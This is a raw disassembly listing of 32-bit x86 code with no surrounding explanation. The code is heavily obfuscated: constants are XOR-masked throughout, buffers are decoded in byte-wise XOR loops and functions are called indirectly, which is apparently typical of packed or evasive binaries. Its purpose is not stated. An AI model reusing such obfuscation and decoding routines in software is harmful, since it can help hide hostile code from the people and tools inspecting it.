  425f76:	xor    ecx,ebx
  425f78:	lea    eax,[eax+ecx*1+0x3272f1]
  425f7f:	mov    ecx,DWORD PTR [ebp-0x40]
  425f82:	cmp    eax,ecx
  425f84:	jb     0x425f63
  425f86:	mov    eax,DWORD PTR [ebp-0x40]
  425f89:	mov    DWORD PTR [ebp-0x28],eax
  425f8c:	mov    eax,DWORD PTR [ebp-0x24]
  425f8f:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  425f96:	mov    DWORD PTR [ebp-0xd4],eax
  425f9c:	mov    edi,0xf89c85ba
  425fa1:	mov    DWORD PTR [ebp-0x2c],edi
  425fa4:	mov    eax,DWORD PTR [ebp-0x38]
  425fa7:	xor    eax,ebx
  425fa9:	add    eax,esi
  425fab:	mov    DWORD PTR [ebp-0xc],eax
  425fae:	mov    eax,DWORD PTR [ebp-0x38]
  425fb1:	xor    eax,ebx
  425fb3:	add    eax,esi
  425fb5:	mov    DWORD PTR [ebp-0x8],eax
  425fb8:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  425fbf:	mov    DWORD PTR [ebp-0x4c],0xf89c85bc
  425fc6:	mov    eax,DWORD PTR [ebp-0x38]
  425fc9:	mov    ecx,DWORD PTR [ebp-0x28]
  425fcc:	xor    eax,ebx
  425fce:	add    eax,esi
  425fd0:	cmp    ecx,eax
  425fd2:	je     0x4261d1
  425fd8:	jmp    0x4261ad
  425fdd:	mov    ecx,DWORD PTR [ebp-0xc]
  425fe0:	mov    eax,DWORD PTR [ebp-0x28]
  425fe3:	sub    eax,ecx
  425fe5:	mov    ecx,DWORD PTR [ebp-0x48]
  425fe8:	xor    ecx,ebx
  425fea:	add    ecx,esi
  425fec:	xor    edx,edx
  425fee:	div    ecx
  425ff0:	mov    DWORD PTR [ebp-0x8],eax
  425ff3:	mov    eax,DWORD PTR [ebp-0x4c]
  425ff6:	mov    ecx,DWORD PTR [ebp-0x8]
  425ff9:	xor    eax,ebx
  425ffb:	add    eax,esi
  425ffd:	cmp    ecx,eax
  425fff:	jbe    0x42600b
  426001:	mov    eax,DWORD PTR [ebp-0x4c]
  426004:	xor    eax,ebx
  426006:	add    eax,esi
  426008:	mov    DWORD PTR [ebp-0x8],eax
  42600b:	mov    eax,DWORD PTR [ebp-0x48]
  42600e:	mov    ecx,DWORD PTR [ebp-0x8]
  426011:	xor    eax,ebx
  426013:	add    eax,esi
  426015:	imul   eax,ecx
  426018:	mov    DWORD PTR [ebp-0x8],eax
  42601b:	mov    eax,DWORD PTR [ebp-0x38]
  42601e:	mov    ecx,DWORD PTR [ebp-0x8]
  426021:	xor    eax,ebx
  426023:	add    eax,esi
  426025:	cmp    ecx,eax
  426027:	je     0x42619b
  42602d:	mov    eax,DWORD PTR [ebp-0x8]
  426030:	mov    DWORD PTR [ebp-0x14],eax
  426033:	mov    eax,DWORD PTR [ebp-0xc]
  426036:	add    eax,DWORD PTR [ebp-0xd4]
  42603c:	mov    DWORD PTR [ebp-0x20],0xf89c85a5
  426043:	mov    DWORD PTR [ebp-0x34],edi
  426046:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  426050:	mov    DWORD PTR [ebp-0x8],eax
  426053:	mov    DWORD PTR [ebp-0x30],0xf89c85b8
  42605a:	mov    DWORD PTR [ebp-0x1c],edi
  42605d:	mov    eax,DWORD PTR [ebp-0x20]
  426060:	xor    eax,ebx
  426062:	add    eax,esi
  426064:	jmp    0x42615a
  426069:	mov    DWORD PTR [ebp-0xe0],0xf89c85b0
  426073:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  42607d:	mov    eax,DWORD PTR [ebp-0x1c]
  426080:	mov    ecx,DWORD PTR [ebp-0x44]
  426083:	xor    eax,ebx
  426085:	add    eax,esi
  426087:	imul   eax,ecx
  42608a:	mov    ecx,DWORD PTR [ebp-0x8]
  42608d:	mov    al,BYTE PTR [eax+ecx*1]
  426090:	mov    BYTE PTR [ebp-0x2],al
  426093:	mov    eax,DWORD PTR [ebp-0x1c]
  426096:	mov    ecx,DWORD PTR [ebp-0x44]
  426099:	xor    eax,ebx
  42609b:	add    eax,esi
  42609d:	imul   eax,ecx
  4260a0:	mov    ecx,DWORD PTR [ebp-0xe8]
  4260a6:	xor    ecx,ebx
  4260a8:	add    eax,ecx
  4260aa:	mov    ecx,DWORD PTR [ebp-0x8]
  4260ad:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  4260b5:	mov    ecx,DWORD PTR [ebp-0xe0]
  4260bb:	xor    ecx,ebx
  4260bd:	lea    eax,[ecx+eax*1+0x3272f1]
  4260c4:	movzx  ecx,BYTE PTR [ebp-0x2]
  4260c8:	xor    ecx,eax
  4260ca:	mov    BYTE PTR [ebp-0x2],cl
  4260cd:	mov    al,BYTE PTR [ebp-0x2]
  4260d0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4260d3:	mov    edx,DWORD PTR [ebp-0x44]
  4260d6:	xor    ecx,ebx
  4260d8:	add    ecx,esi
  4260da:	imul   ecx,edx
  4260dd:	mov    edx,DWORD PTR [ebp-0x8]
  4260e0:	mov    BYTE PTR [ecx+edx*1],al
  4260e3:	mov    eax,DWORD PTR [ebp-0x1c]
  4260e6:	mov    ecx,DWORD PTR [ebp-0x44]
  4260e9:	xor    eax,ebx
  4260eb:	add    eax,esi
  4260ed:	imul   eax,ecx
  4260f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4260f3:	mov    al,BYTE PTR [eax+ecx*1]
  4260f6:	mov    BYTE PTR [ebp-0x2],al
  4260f9:	mov    eax,DWORD PTR [ebp-0x1c]
  4260fc:	mov    ecx,DWORD PTR [ebp-0x44]
  4260ff:	xor    eax,ebx
  426101:	add    eax,esi
  426103:	imul   eax,ecx
  426106:	mov    ecx,DWORD PTR [ebp-0x34]
  426109:	xor    ecx,ebx
  42610b:	add    eax,ecx
  42610d:	mov    ecx,DWORD PTR [ebp-0x8]
  426110:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  426118:	mov    ecx,DWORD PTR [ebp-0xc4]
  42611e:	xor    ecx,ebx
  426120:	lea    eax,[ecx+eax*1+0x3272f1]
  426127:	movzx  ecx,BYTE PTR [ebp-0x2]
  42612b:	xor    ecx,eax
  42612d:	mov    BYTE PTR [ebp-0x2],cl
  426130:	mov    al,BYTE PTR [ebp-0x2]
  426133:	mov    ecx,DWORD PTR [ebp-0x1c]
  426136:	mov    edx,DWORD PTR [ebp-0x44]
  426139:	xor    ecx,ebx
  42613b:	add    ecx,esi
  42613d:	imul   ecx,edx
  426140:	mov    edx,DWORD PTR [ebp-0x8]
  426143:	mov    BYTE PTR [ecx+edx*1],al
  426146:	mov    eax,DWORD PTR [ebp-0x30]
  426149:	mov    ecx,DWORD PTR [ebp-0x34]
  42614c:	xor    eax,ebx
  42614e:	xor    ecx,ebx
  426150:	add    eax,esi
  426152:	add    ecx,esi
  426154:	imul   eax,ecx
  426157:	add    eax,DWORD PTR [ebp-0x44]
  42615a:	mov    DWORD PTR [ebp-0x44],eax
  42615d:	mov    eax,DWORD PTR [ebp-0x44]
  426160:	mov    ecx,DWORD PTR [ebp-0x14]
  426163:	cmp    ecx,eax
  426165:	jb     0x426069
  42616b:	mov    eax,DWORD PTR [ebp-0x34]
  42616e:	mov    ecx,DWORD PTR [ebp-0x14]
  426171:	xor    eax,ebx
  426173:	add    eax,esi
  426175:	imul   eax,ecx
  426178:	mov    ecx,DWORD PTR [ebp-0x20]
  42617b:	xor    ecx,ebx
  42617d:	add    ecx,esi
  42617f:	or     eax,ecx
  426181:	mov    ecx,DWORD PTR [ebp-0x2c]
  426184:	xor    ecx,ebx
  426186:	add    eax,ecx
  426188:	mov    ecx,DWORD PTR [ebp-0x2c]
  42618b:	xor    ecx,ebx
  42618d:	add    eax,ecx
  42618f:	mov    ecx,DWORD PTR [ebp-0xc]
  426192:	lea    eax,[eax+ecx*1+0x64e5e2]
  426199:	jmp    0x4261aa
  42619b:	mov    eax,DWORD PTR [ebp-0x2c]
  42619e:	mov    ecx,DWORD PTR [ebp-0xc]
  4261a1:	xor    eax,ebx
  4261a3:	lea    eax,[eax+ecx*1+0x3272f1]
  4261aa:	mov    DWORD PTR [ebp-0xc],eax
  4261ad:	mov    eax,DWORD PTR [ebp-0x2c]
  4261b0:	xor    eax,ebx
  4261b2:	mov    ecx,0xffcd8d0f
  4261b7:	sub    ecx,eax
  4261b9:	add    ecx,DWORD PTR [ebp-0x28]
  4261bc:	mov    eax,DWORD PTR [ebp-0x2c]
  4261bf:	mov    edx,DWORD PTR [ebp-0xc]
  4261c2:	xor    eax,ebx
  4261c4:	add    eax,esi
  4261c6:	imul   eax,edx
  4261c9:	cmp    eax,ecx
  4261cb:	jbe    0x425fdd
  4261d1:	mov    eax,DWORD PTR [ebp-0x10]
  4261d4:	mov    ecx,DWORD PTR [ebp-0x40]
  4261d7:	mov    eax,DWORD PTR [ebp+0x8]
  4261da:	mov    edx,DWORD PTR [ebp-0x54]
  4261dd:	mov    eax,DWORD PTR [eax+0x1e0]
  4261e3:	xor    edx,ebx
  4261e5:	add    edx,esi
  4261e7:	push   edx
  4261e8:	mov    edx,DWORD PTR [ebp-0x3c]
  4261eb:	xor    edx,ebx
  4261ed:	add    edx,esi
  4261ef:	push   edx
  4261f0:	push   ecx
  4261f1:	mov    DWORD PTR [ebp-0x30],ecx
  4261f4:	mov    ecx,DWORD PTR [ebp-0x10]
  4261f7:	xor    ecx,ebx
  4261f9:	add    ecx,esi
  4261fb:	push   ecx
  4261fc:	call   DWORD PTR [eax+0x14]
  4261ff:	mov    edi,eax
  426201:	mov    eax,DWORD PTR [ebp-0x10]
  426204:	xor    eax,ebx
  426206:	add    eax,esi
  426208:	cmp    eax,edi
  42620a:	je     0x426265
  42620c:	mov    eax,DWORD PTR [ebp-0x10]
  42620f:	jmp    0x426232
  426211:	mov    ecx,DWORD PTR [ebp-0x24]
  426214:	xor    eax,ebx
  426216:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f1]
  42621d:	mov    BYTE PTR [eax+edi*1+0x3272f1],cl
  426224:	mov    ecx,DWORD PTR [ebp-0x18]
  426227:	xor    ecx,ebx
  426229:	lea    eax,[ecx+eax*1+0x3272f1]
  426230:	xor    eax,ebx
  426232:	mov    ecx,DWORD PTR [ebp-0x40]
  426235:	sub    ecx,esi
  426237:	xor    ecx,ebx
  426239:	cmp    eax,ecx
  42623b:	jne    0x426211
  42623d:	mov    eax,DWORD PTR [ebp+0x8]
  426240:	mov    ecx,DWORD PTR [ebp-0x50]
  426243:	mov    eax,DWORD PTR [eax+0x1e0]
  426249:	xor    ecx,ebx
  42624b:	add    ecx,esi
  42624d:	push   ecx
  42624e:	mov    ecx,DWORD PTR [ebp-0x10]
  426251:	xor    ecx,ebx
  426253:	add    ecx,esi
  426255:	push   ecx
  426256:	push   DWORD PTR [ebp-0x24]
  426259:	call   DWORD PTR [eax+0x18]
  42625c:	mov    eax,DWORD PTR [ebp-0x30]
  42625f:	mov    DWORD PTR [ebp-0x24],edi
  426262:	mov    DWORD PTR [ebp-0x40],eax
  426265:	mov    edi,DWORD PTR [ebp-0x24]
  426268:	mov    eax,DWORD PTR [ebp-0x18]
  42626b:	mov    ecx,DWORD PTR [ebp-0x10]
  42626e:	xor    eax,ebx
  426270:	mov    DWORD PTR [ebp-0x30],edi
  426273:	add    eax,esi
  426275:	mov    DWORD PTR [ebp-0x5c],0x3c2b332b
  42627c:	mov    DWORD PTR [ebp-0x58],0x362b3e2b
  426283:	jmp    0x4262b6
  426285:	xor    ecx,ebx
  426287:	mov    dl,BYTE PTR [ebp+ecx*1+0x327295]
  42628e:	xor    dl,0x7c
  426291:	inc    dl
  426293:	mov    DWORD PTR [ebp-0x3c],ecx
  426296:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272f1]
  42629e:	movzx  edx,dl
  4262a1:	cmp    ecx,edx
  4262a3:	jne    0x4262c0
  4262a5:	mov    ecx,DWORD PTR [ebp-0x18]
  4262a8:	mov    edx,DWORD PTR [ebp-0x3c]
  4262ab:	xor    ecx,ebx
  4262ad:	lea    ecx,[ecx+edx*1+0x3272f1]
  4262b4:	xor    ecx,ebx
  4262b6:	cmp    ecx,0xf89c85bd
  4262bc:	jne    0x426285
  4262be:	jmp    0x4262c7
  4262c0:	mov    eax,DWORD PTR [ebp-0x10]
  4262c3:	xor    eax,ebx
  4262c5:	add    eax,esi
  4262c7:	mov    ecx,DWORD PTR [ebp-0x10]
  4262ca:	xor    ecx,ebx
  4262cc:	add    ecx,esi
  4262ce:	cmp    ecx,eax
  4262d0:	je     0x426443
  4262d6:	mov    eax,DWORD PTR [edi+0x8]
  4262d9:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4262e0:	mov    DWORD PTR [ebp-0x3c],0xf89cc3d4
  4262e7:	mov    DWORD PTR [ebp-0x48],0xf89cb5a5
  4262ee:	mov    DWORD PTR [ebp-0x20],0xf89c85b9
  4262f5:	mov    DWORD PTR [ebp-0x14],eax
  4262f8:	mov    eax,DWORD PTR [ebp+0x8]
  4262fb:	mov    ecx,DWORD PTR [ebp-0x20]
  4262fe:	xor    ecx,ebx
  426300:	add    ecx,esi
  426302:	push   ecx
  426303:	mov    ecx,DWORD PTR [ebp-0x48]
  426306:	mov    eax,DWORD PTR [eax+0x1e0]
  42630c:	xor    ecx,ebx
  42630e:	add    ecx,esi
  426310:	push   ecx
  426311:	mov    ecx,DWORD PTR [ebp-0x3c]
  426314:	xor    ecx,ebx
  426316:	add    ecx,esi
  426318:	push   ecx
  426319:	mov    ecx,DWORD PTR [ebp-0xc]
  42631c:	xor    ecx,ebx
  42631e:	add    ecx,esi
  426320:	push   ecx
  426321:	call   DWORD PTR [eax+0x14]
  426324:	mov    edi,eax
  426326:	mov    eax,DWORD PTR [ebp+0x8]
  426329:	mov    ecx,DWORD PTR [ebp-0x20]
  42632c:	mov    eax,DWORD PTR [eax+0x1e0]
  426332:	xor    ecx,ebx
  426334:	add    ecx,esi
  426336:	push   ecx
  426337:	mov    ecx,DWORD PTR [ebp-0x48]
  42633a:	xor    ecx,ebx
  42633c:	add    ecx,esi
  42633e:	push   ecx
  42633f:	mov    ecx,DWORD PTR [ebp-0xc]
  426342:	push   DWORD PTR [ebp-0x14]
  426345:	xor    ecx,ebx
  426347:	add    ecx,esi
  426349:	push   ecx
  42634a:	call   DWORD PTR [eax+0x14]
  42634d:	mov    ecx,DWORD PTR [ebp-0xc]
  426350:	xor    ecx,ebx
  426352:	add    ecx,esi
  426354:	mov    DWORD PTR [ebp-0x20],eax
  426357:	cmp    ecx,edi
  426359:	je     0x4266e6
  42635f:	mov    ecx,DWORD PTR [ebp-0xc]
  426362:	xor    ecx,ebx
  426364:	add    ecx,esi
  426366:	cmp    ecx,eax
  426368:	je     0x4266e6
  42636e:	mov    DWORD PTR [ebp-0x3c],0xf89c85b8
  426375:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  42637c:	mov    ecx,DWORD PTR [ebp-0x3c]
  42637f:	xor    cl,0xaa
  426382:	sub    cl,0xf
  426385:	mov    BYTE PTR [edi],cl
  426387:	mov    ecx,DWORD PTR [ebp-0xc]
  42638a:	xor    cl,0xaa
  42638d:	sub    cl,0xf
  426390:	mov    BYTE PTR [edi+0x1],cl
  426393:	mov    ecx,DWORD PTR [ebp-0x54]
  426396:	xor    cl,0xaa
  426399:	sub    cl,0xf
  42639c:	mov    BYTE PTR [edi+0x2],cl
  42639f:	and    DWORD PTR [ebp-0xc8],0x0
  4263a6:	and    DWORD PTR [ebp-0xdc],0x0
  4263ad:	lea    ecx,[ebp-0xdc]
  4263b3:	push   ecx
  4263b4:	push   DWORD PTR [ebp-0x14]
  4263b7:	push   eax
  4263b8:	lea    eax,[ebp-0xc8]
  4263be:	push   eax
  4263bf:	mov    eax,DWORD PTR [ebp-0x30]
  4263c2:	push   DWORD PTR [eax+0xc]
  4263c5:	mov    eax,DWORD PTR [ebp-0x24]
  4263c8:	add    eax,0x10
  4263cb:	push   eax
  4263cc:	push   edi
  4263cd:	call   0x425674
  4263d2:	mov    DWORD PTR [ebp-0x3c],eax
  4263d5:	mov    eax,DWORD PTR [ebp+0x8]
  4263d8:	mov    ecx,DWORD PTR [ebp-0x50]
  4263db:	mov    eax,DWORD PTR [eax+0x1e0]
  4263e1:	xor    ecx,ebx
  4263e3:	add    ecx,esi
  4263e5:	push   ecx
  4263e6:	mov    ecx,DWORD PTR [ebp-0xc]
  4263e9:	xor    ecx,ebx
  4263eb:	add    ecx,esi
  4263ed:	push   ecx
  4263ee:	push   edi
  4263ef:	call   DWORD PTR [eax+0x18]
  4263f2:	mov    eax,DWORD PTR [ebp-0x3c]
  4263f5:	add    eax,0xffcd8d0f
  4263fa:	xor    eax,ebx
  4263fc:	cmp    eax,0xf89c85a5
  426401:	mov    eax,DWORD PTR [ebp+0x8]
  426404:	mov    eax,DWORD PTR [eax+0x1e0]
  42640a:	mov    ecx,DWORD PTR [ebp-0x50]
  42640d:	jne    0x426430
  42640f:	xor    ecx,ebx
  426411:	add    ecx,esi
  426413:	push   ecx
  426414:	mov    ecx,DWORD PTR [ebp-0xc]
  426417:	xor    ecx,ebx
  426419:	add    ecx,esi
  42641b:	push   ecx
  42641c:	push   DWORD PTR [ebp-0x24]
  42641f:	call   DWORD PTR [eax+0x18]
  426422:	mov    eax,DWORD PTR [ebp-0x20]
  426425:	mov    DWORD PTR [ebp-0x24],eax
  426428:	mov    eax,DWORD PTR [ebp-0x14]
  42642b:	mov    DWORD PTR [ebp-0x40],eax
  42642e:	jmp    0x426443
  426430:	xor    ecx,ebx
  426432:	add    ecx,esi
  426434:	push   ecx
  426435:	mov    ecx,DWORD PTR [ebp-0xc]
  426438:	xor    ecx,ebx
  42643a:	add    ecx,esi
  42643c:	push   ecx
  42643d:	push   DWORD PTR [ebp-0x20]
  426440:	call   DWORD PTR [eax+0x18]
  426443:	mov    eax,DWORD PTR [ebp-0x40]
  426446:	mov    DWORD PTR [ebp-0x38],eax
  426449:	mov    eax,DWORD PTR [ebp-0x24]
  42644c:	mov    DWORD PTR [ebp-0x28],0xf89c85a5
  426453:	mov    DWORD PTR [ebp-0x3c],eax
  426456:	mov    edi,0xf89c85ba
  42645b:	mov    DWORD PTR [ebp-0x2c],edi
  42645e:	mov    eax,DWORD PTR [ebp-0x28]
  426461:	xor    eax,ebx
  426463:	add    eax,esi
  426465:	mov    DWORD PTR [ebp-0xc],eax
  426468:	mov    eax,DWORD PTR [ebp-0x28]
  42646b:	xor    eax,ebx
  42646d:	add    eax,esi
  42646f:	mov    DWORD PTR [ebp-0x14],eax
  426472:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  426479:	mov    DWORD PTR [ebp-0x20],0xf89c85bc
  426480:	mov    eax,DWORD PTR [ebp-0x28]
  426483:	mov    ecx,DWORD PTR [ebp-0x38]
  426486:	xor    eax,ebx
  426488:	add    eax,esi
  42648a:	cmp    ecx,eax
  42648c:	je     0x426682
  426492:	jmp    0x42665e
  426497:	mov    ecx,DWORD PTR [ebp-0xc]
  42649a:	mov    eax,DWORD PTR [ebp-0x38]
  42649d:	sub    eax,ecx
  42649f:	mov    ecx,DWORD PTR [ebp-0x48]
  4264a2:	xor    ecx,ebx
  4264a4:	add    ecx,esi
  4264a6:	xor    edx,edx
  4264a8:	div    ecx
  4264aa:	mov    DWORD PTR [ebp-0x14],eax
  4264ad:	mov    eax,DWORD PTR [ebp-0x20]
  4264b0:	mov    ecx,DWORD PTR [ebp-0x14]
  4264b3:	xor    eax,ebx
  4264b5:	add    eax,esi
  4264b7:	cmp    ecx,eax
  4264b9:	jbe    0x4264c5
  4264bb:	mov    eax,DWORD PTR [ebp-0x20]
  4264be:	xor    eax,ebx
  4264c0:	add    eax,esi
  4264c2:	mov    DWORD PTR [ebp-0x14],eax
  4264c5:	mov    eax,DWORD PTR [ebp-0x48]
  4264c8:	mov    ecx,DWORD PTR [ebp-0x14]
  4264cb:	xor    eax,ebx
  4264cd:	add    eax,esi
  4264cf:	imul   eax,ecx
  4264d2:	mov    DWORD PTR [ebp-0x14],eax
  4264d5:	mov    eax,DWORD PTR [ebp-0x28]
  4264d8:	mov    ecx,DWORD PTR [ebp-0x14]
  4264db:	xor    eax,ebx
  4264dd:	add    eax,esi
  4264df:	cmp    ecx,eax
  4264e1:	je     0x42664c
  4264e7:	mov    eax,DWORD PTR [ebp-0x14]
  4264ea:	mov    DWORD PTR [ebp-0x34],eax
  4264ed:	mov    eax,DWORD PTR [ebp-0xc]
  4264f0:	add    eax,DWORD PTR [ebp-0x3c]
  4264f3:	mov    DWORD PTR [ebp-0x4c],0xf89c85a5
  4264fa:	mov    DWORD PTR [ebp-0x14],edi
  4264fd:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  426504:	mov    DWORD PTR [ebp-0x1c],eax
  426507:	mov    DWORD PTR [ebp-0x30],0xf89c85b8
  42650e:	mov    DWORD PTR [ebp-0x8],edi
  426511:	mov    eax,DWORD PTR [ebp-0x4c]
  426514:	xor    eax,ebx
  426516:	add    eax,esi
  426518:	jmp    0x42660b
  42651d:	mov    DWORD PTR [ebp-0xe4],0xf89c85b0
  426527:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  426531:	mov    eax,DWORD PTR [ebp-0x8]
  426534:	mov    ecx,DWORD PTR [ebp-0x18]
  426537:	xor    eax,ebx
  426539:	add    eax,esi
  42653b:	imul   eax,ecx
  42653e:	mov    ecx,DWORD PTR [ebp-0x1c]
  426541:	mov    al,BYTE PTR [eax+ecx*1]
  426544:	mov    BYTE PTR [ebp-0x1],al
  426547:	mov    eax,DWORD PTR [ebp-0x8]
  42654a:	mov    ecx,DWORD PTR [ebp-0x18]
  42654d:	xor    eax,ebx
  42654f:	add    eax,esi
  426551:	imul   eax,ecx
  426554:	mov    ecx,DWORD PTR [ebp-0x54]
  426557:	xor    ecx,ebx
  426559:	add    eax,ecx
  42655b:	mov    ecx,DWORD PTR [ebp-0x1c]
  42655e:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  426566:	mov    ecx,DWORD PTR [ebp-0xe4]
  42656c:	xor    ecx,ebx
  42656e:	lea    eax,[ecx+eax*1+0x3272f1]
  426575:	movzx  ecx,BYTE PTR [ebp-0x1]
  426579:	xor    ecx,eax
  42657b:	mov    BYTE PTR [ebp-0x1],cl
  42657e:	mov    al,BYTE PTR [ebp-0x1]
  426581:	mov    ecx,DWORD PTR [ebp-0x8]
  426584:	mov    edx,DWORD PTR [ebp-0x18]
  426587:	xor    ecx,ebx
  426589:	add    ecx,esi
  42658b:	imul   ecx,edx
  42658e:	mov    edx,DWORD PTR [ebp-0x1c]
  426591:	mov    BYTE PTR [ecx+edx*1],al
  426594:	mov    eax,DWORD PTR [ebp-0x8]
  426597:	mov    ecx,DWORD PTR [ebp-0x18]
  42659a:	xor    eax,ebx
  42659c:	add    eax,esi
  42659e:	imul   eax,ecx
  4265a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  4265a4:	mov    al,BYTE PTR [eax+ecx*1]
  4265a7:	mov    BYTE PTR [ebp-0x1],al
  4265aa:	mov    eax,DWORD PTR [ebp-0x8]
  4265ad:	mov    ecx,DWORD PTR [ebp-0x18]
  4265b0:	xor    eax,ebx
  4265b2:	add    eax,esi
  4265b4:	imul   eax,ecx
  4265b7:	mov    ecx,DWORD PTR [ebp-0x14]
  4265ba:	xor    ecx,ebx
  4265bc:	add    eax,ecx
  4265be:	mov    ecx,DWORD PTR [ebp-0x1c]
  4265c1:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  4265c9:	mov    ecx,DWORD PTR [ebp-0xd0]
  4265cf:	xor    ecx,ebx
  4265d1:	lea    eax,[ecx+eax*1+0x3272f1]
  4265d8:	movzx  ecx,BYTE PTR [ebp-0x1]
  4265dc:	xor    ecx,eax
  4265de:	mov    BYTE PTR [ebp-0x1],cl
  4265e1:	mov    al,BYTE PTR [ebp-0x1]
  4265e4:	mov    ecx,DWORD PTR [ebp-0x8]
  4265e7:	mov    edx,DWORD PTR [ebp-0x18]
  4265ea:	xor    ecx,ebx
  4265ec:	add    ecx,esi
  4265ee:	imul   ecx,edx
  4265f1:	mov    edx,DWORD PTR [ebp-0x1c]
  4265f4:	mov    BYTE PTR [ecx+edx*1],al
  4265f7:	mov    eax,DWORD PTR [ebp-0x30]
  4265fa:	mov    ecx,DWORD PTR [ebp-0x14]
  4265fd:	xor    eax,ebx
  4265ff:	xor    ecx,ebx
  426601:	add    eax,esi
  426603:	add    ecx,esi
  426605:	imul   eax,ecx
  426608:	add    eax,DWORD PTR [ebp-0x18]
  42660b:	mov    DWORD PTR [ebp-0x18],eax
  42660e:	mov    eax,DWORD PTR [ebp-0x18]
  426611:	mov    ecx,DWORD PTR [ebp-0x34]
  426614:	cmp    ecx,eax
  426616:	jb     0x42651d
  42661c:	mov    eax,DWORD PTR [ebp-0x14]
  42661f:	mov    ecx,DWORD PTR [ebp-0x34]
  426622:	xor    eax,ebx
  426624:	add    eax,esi
  426626:	imul   eax,ecx
  426629:	mov    ecx,DWORD PTR [ebp-0x4c]
  42662c:	xor    ecx,ebx
  42662e:	add    ecx,esi
  426630:	or     eax,ecx
  426632:	mov    ecx,DWORD PTR [ebp-0x2c]
  426635:	xor    ecx,ebx
  426637:	add    eax,ecx
  426639:	mov    ecx,DWORD PTR [ebp-0x2c]
  42663c:	xor    ecx,ebx
  42663e:	add    eax,ecx
  426640:	mov    ecx,DWORD PTR [ebp-0xc]
  426643:	lea    eax,[eax+ecx*1+0x64e5e2]
  42664a:	jmp    0x42665b
  42664c:	mov    eax,DWORD PTR [ebp-0x2c]
  42664f:	mov    ecx,DWORD PTR [ebp-0xc]
  426652:	xor    eax,ebx
  426654:	lea    eax,[eax+ecx*1+0x3272f1]
  42665b:	mov    DWORD PTR [ebp-0xc],eax
  42665e:	mov    eax,DWORD PTR [ebp-0x2c]
  426661:	xor    eax,ebx
  426663:	mov    ecx,0xffcd8d0f
  426668:	sub    ecx,eax
  42666a:	add    ecx,DWORD PTR [ebp-0x38]
  42666d:	mov    eax,DWORD PTR [ebp-0x2c]
  426670:	mov    edx,DWORD PTR [ebp-0xc]
  426673:	xor    eax,ebx
  426675:	add    eax,esi
  426677:	imul   eax,edx
  42667a:	cmp    eax,ecx
  42667c:	jbe    0x426497
  426682:	push   DWORD PTR [ebp+0x8]
  426685:	mov    eax,DWORD PTR [ebp+0x8]
  426688:	push   DWORD PTR [eax+0x1cc]
  42668e:	lea    eax,[ebp-0xd8]
  426694:	push   eax
  426695:	mov    eax,DWORD PTR [ebp+0x8]
  426698:	mov    eax,DWORD PTR [eax+0x1c4]
  42669e:	push   DWORD PTR [eax]
  4266a0:	mov    eax,DWORD PTR [ebp+0x8]
  4266a3:	mov    eax,DWORD PTR [eax+0x1c0]
  4266a9:	push   DWORD PTR [eax]
  4266ab:	push   DWORD PTR [ebp-0x40]
  4266ae:	push   DWORD PTR [ebp-0x24]
  4266b1:	call   0x427148
  4266b6:	mov    DWORD PTR [ebp-0x3c],eax
  4266b9:	mov    eax,DWORD PTR [ebp-0x10]
  4266bc:	mov    ecx,DWORD PTR [ebp-0x24]
  4266bf:	xor    eax,ebx
  4266c1:	add    eax,esi
  4266c3:	cmp    eax,ecx
  4266c5:	je     0x4266e6
  4266c7:	mov    eax,DWORD PTR [ebp+0x8]
  4266ca:	mov    ecx,DWORD PTR [ebp-0x50]
  4266cd:	mov    eax,DWORD PTR [eax+0x1e0]
  4266d3:	xor    ecx,ebx
  4266d5:	add    ecx,esi
  4266d7:	push   ecx
  4266d8:	mov    ecx,DWORD PTR [ebp-0x10]
  4266db:	xor    ecx,ebx
  4266dd:	add    ecx,esi
  4266df:	push   ecx
  4266e0:	push   DWORD PTR [ebp-0x24]
  4266e3:	call   DWORD PTR [eax+0x18]
  4266e6:	pop    edi
  4266e7:	pop    esi
  4266e8:	pop    ebx
  4266e9:	leave  
  4266ea:	ret    0x4
  4266ed:	push   ebp
  4266ee:	mov    ebp,esp
  4266f0:	push   ecx
  4266f1:	push   ecx
  4266f2:	lea    eax,[ebp-0x8]
  4266f5:	mov    DWORD PTR [ebp-0x4],eax
  4266f8:	push   esi
  4266f9:	mov    esi,DWORD PTR [ebp-0x4]
  4266fc:	mov    eax,0xf881ba2f
  426701:	mov    DWORD PTR [esi],eax
  426703:	mov    esi,DWORD PTR [ebp-0x8]
  426706:	cmp    esi,eax
  426708:	pop    esi
  426709:	jne    0x426713
  42670b:	mov    BYTE PTR [ecx+0xa],0x83
  42670f:	mov    BYTE PTR [edx+0x8],0x2e
  426713:	mov    BYTE PTR [edx+0xa],0x83
  426717:	mov    BYTE PTR [ecx+0x2],0x11
  42671b:	leave  
  42671c:	ret    
  42671d:	push   ebp
  42671e:	mov    ebp,esp
  426720:	push   ecx
  426721:	push   ecx
  426722:	lea    eax,[ebp-0x8]
  426725:	mov    DWORD PTR [ebp-0x4],eax
  426728:	mov    edx,DWORD PTR [ebp-0x4]
  42672b:	mov    eax,0xf88b0bc3
  426730:	mov    DWORD PTR [edx],eax
  426732:	mov    edx,DWORD PTR [ebp-0x8]
  426735:	cmp    edx,eax
  426737:	jne    0x426748
  426739:	mov    eax,DWORD PTR [ebp+0x8]
  42673c:	mov    BYTE PTR [ecx+0x9],0xf
  426740:	mov    BYTE PTR [eax+0x7],0x56
  426744:	mov    BYTE PTR [ecx+0x6],0xe
  426748:	mov    BYTE PTR [ecx+0x3],0x1f
  42674c:	leave  
  42674d:	ret    0x4
  426750:	push   ebp
  426751:	mov    ebp,esp
  426753:	push   ecx
  426754:	push   ecx
  426755:	lea    eax,[ebp-0x8]
